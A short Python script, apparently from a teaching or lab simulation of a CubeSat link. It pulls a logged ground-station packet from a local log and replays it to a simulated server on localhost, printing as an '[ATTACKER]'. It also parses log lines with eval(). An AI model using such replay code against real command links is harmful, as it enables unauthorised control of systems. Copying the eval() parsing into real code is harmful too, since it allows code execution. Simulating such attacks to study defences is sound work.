import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import socket
import json
from shared.logger import log_event

HOST = "127.0.0.1"
PORT = 5000
LOG_FILE = "logs/comm.log"


def extract_replay_packet():

    with open(LOG_FILE, "r") as f:
        for line in f:
            if "| GROUND | SENT |" in line:
                packet_str = line.split("| SENT |")[1].strip()
                packet = eval(packet_str)
                return packet
    return None


def replay_attack():
    packet = extract_replay_packet()

    if not packet:
        print("[ATTACKER] No packet found to replay.")
        return

    print(f"[ATTACKER] Replaying packet: {packet}")

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    log_event("ATTACKER", "REPLAYED", packet)

    client.send(json.dumps(packet).encode())

    response = client.recv(1024)
    print(f"[ATTACKER] CubeSat response: {json.loads(response.decode())}")

    client.close()


if __name__ == "__main__":
    replay_attack()
